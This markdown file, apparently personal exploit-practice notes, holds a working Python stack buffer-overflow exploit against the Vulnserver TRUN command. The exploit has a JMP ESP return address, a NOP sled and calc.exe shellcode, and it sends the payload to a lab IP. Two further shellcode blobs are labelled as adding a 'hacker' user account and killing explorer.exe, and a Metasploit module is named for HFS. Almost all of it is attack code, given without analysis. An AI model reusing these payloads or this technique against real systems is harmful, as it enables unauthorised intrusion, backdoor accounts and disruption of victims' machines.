## Exploiting Vulnserver
```python 
#!/usr/bin/python
# Tested on 
# - Windows 7 Enterprise
# - Windows Server 2012 R2 (DEP disabled)

import socket

buf = "TRUN /.:/"
buf += "\x41" * 2003 # EIP 386F4337
buf += "\xaf\x11\x50\x62" #JMP ESP 
buf += "\x90" * 30 #NOP Sledges
buf += ("\xda\xd5\xb8\x7d\xb3\x4c\x5e\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x31\x31\x47\x18\x83\xc7\x04\x03\x47\x69\x51\xb9\xa2\x79\x17"
"\x42\x5b\x79\x78\xca\xbe\x48\xb8\xa8\xcb\xfa\x08\xba\x9e\xf6"
"\xe3\xee\x0a\x8d\x86\x26\x3c\x26\x2c\x11\x73\xb7\x1d\x61\x12"
"\x3b\x5c\xb6\xf4\x02\xaf\xcb\xf5\x43\xd2\x26\xa7\x1c\x98\x95"
"\x58\x29\xd4\x25\xd2\x61\xf8\x2d\x07\x31\xfb\x1c\x96\x4a\xa2"
"\xbe\x18\x9f\xde\xf6\x02\xfc\xdb\x41\xb8\x36\x97\x53\x68\x07"
"\x58\xff\x55\xa8\xab\x01\x91\x0e\x54\x74\xeb\x6d\xe9\x8f\x28"
"\x0c\x35\x05\xab\xb6\xbe\xbd\x17\x47\x12\x5b\xd3\x4b\xdf\x2f"
"\xbb\x4f\xde\xfc\xb7\x6b\x6b\x03\x18\xfa\x2f\x20\xbc\xa7\xf4"
"\x49\xe5\x0d\x5a\x75\xf5\xee\x03\xd3\x7d\x02\x57\x6e\xdc\x48"
"\xa6\xfc\x5a\x3e\xa8\xfe\x64\x6e\xc1\xcf\xef\xe1\x96\xcf\x25"
"\x46\x68\x9a\x64\xee\xe1\x43\xfd\xb3\x6f\x74\x2b\xf7\x89\xf7"
"\xde\x87\x6d\xe7\xaa\x82\x2a\xaf\x47\xfe\x23\x5a\x68\xad\x44"
"\x4f\x0b\x30\xd7\x13\xe2\xd7\x5f\xb1\xfa") #calc.exe

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.56.104',9999)) # connect to FTP Server
s.send(buf + '\r\n') 
response = s.recv(1024)
s.close()
```

- - - - 

> net user hacker C0mpL3xP@ss /add
```
"\xda\xda\xbf\xe3\x98\x7d\xcb\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x37\x31\x7d\x18\x03\x7d\x18\x83\xc5\xe7\x7a\x88\x37\x0f\xf8"
"\x73\xc8\xcf\x9d\xfa\x2d\xfe\x9d\x99\x26\x50\x2e\xe9\x6b\x5c"
"\xc5\xbf\x9f\xd7\xab\x17\xaf\x50\x01\x4e\x9e\x61\x3a\xb2\x81"
"\xe1\x41\xe7\x61\xd8\x89\xfa\x60\x1d\xf7\xf7\x31\xf6\x73\xa5"
"\xa5\x73\xc9\x76\x4d\xcf\xdf\xfe\xb2\x87\xde\x2f\x65\x9c\xb8"
"\xef\x87\x71\xb1\xb9\x9f\x96\xfc\x70\x2b\x6c\x8a\x82\xfd\xbd"
"\x73\x28\xc0\x72\x86\x30\x04\xb4\x79\x47\x7c\xc7\x04\x50\xbb"
"\xba\xd2\xd5\x58\x1c\x90\x4e\x85\x9d\x75\x08\x4e\x91\x32\x5e"
"\x08\xb5\xc5\xb3\x22\xc1\x4e\x32\xe5\x40\x14\x11\x21\x09\xce"
"\x38\x70\xf7\xa1\x45\x62\x58\x1d\xe0\xe8\x74\x4a\x99\xb2\x12"
"\x8d\x2f\xc9\x50\x8d\x2f\xd2\xc4\xe6\x1e\x59\x8b\x71\x9f\x88"
"\xe8\x8e\xd5\x91\x58\x07\xb0\x43\xd9\x4a\x43\xbe\x1d\x73\xc0"
"\x4b\xdd\x80\xd8\x39\xd8\xcd\x5e\xd1\x90\x5e\x0b\xd5\x07\x5e"
"\x1e\xbb\xc2\xd4\x81\x31\x7f\x70\xb0\x99\x17\x1b\x57\xb1\x82"
"\xa9\xb7\x06\x7c\x23\xc8\xc4\x4f\xc3\x78\x95\xdc\x40\x59\x3a"
"\x43\xc3\xfd\x44"
```

- - - - 

> taskkill /IM explorer.exe /F
```
"\xb8\xcf\x06\xe6\x36\xdb\xd9\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x36\x83\xeb\xfc\x31\x43\x0f\x03\x43\xc0\xe4\x13\xca\x36\x6a"
"\xdb\x33\xc6\x0b\x55\xd6\xf7\x0b\x01\x92\xa7\xbb\x41\xf6\x4b"
"\x37\x07\xe3\xd8\x35\x80\x04\x69\xf3\xf6\x2b\x6a\xa8\xcb\x2a"
"\xe8\xb3\x1f\x8d\xd1\x7b\x52\xcc\x16\x61\x9f\x9c\xcf\xed\x32"
"\x31\x64\xbb\x8e\xba\x36\x2d\x97\x5f\x8e\x4c\xb6\xf1\x85\x16"
"\x18\xf3\x4a\x23\x11\xeb\x8f\x0e\xeb\x80\x7b\xe4\xea\x40\xb2"
"\x05\x40\xad\x7b\xf4\x98\xe9\xbb\xe7\xee\x03\xb8\x9a\xe8\xd7"
"\xc3\x40\x7c\xcc\x63\x02\x26\x28\x92\xc7\xb1\xbb\x98\xac\xb6"
"\xe4\xbc\x33\x1a\x9f\xb8\xb8\x9d\x70\x49\xfa\xb9\x54\x12\x58"
"\xa3\xcd\xfe\x0f\xdc\x0e\xa1\xf0\x78\x44\x4f\xe4\xf0\x07\x05"
"\xfb\x87\x3d\x6b\xfb\x97\x3d\xdb\x94\xa6\xb6\xb4\xe3\x36\x1d"
"\xf1\x1c\x7d\x3c\x53\xb5\xd8\xd4\xe6\xd8\xda\x02\x24\xe5\x58"
"\xa7\xd4\x12\x40\xc2\xd1\x5f\xc6\x3e\xab\xf0\xa3\x40\x18\xf0"
"\xe1\x35\xff\x7d\x61\xdd\x96\xed\x19\x01\x47\xa7\xac\x61\xf2"
"\x4f\x5f\x0e\x93\xdd\xfa\xbc\x45\x47\x7d\x24\xb9\xa8\x3b\xa6"
```

## Vulnerable Application 

Vulnerable Application | OS | Metasploit
--- | --- | ---
[HFS](https://liquidtelecom.dl.sourceforge.net/project/hfs/HFS/2.3b/hfs2.3b.zip) | Windows 7 | `use exploit/windows/http/rejetto_hfs_exec`
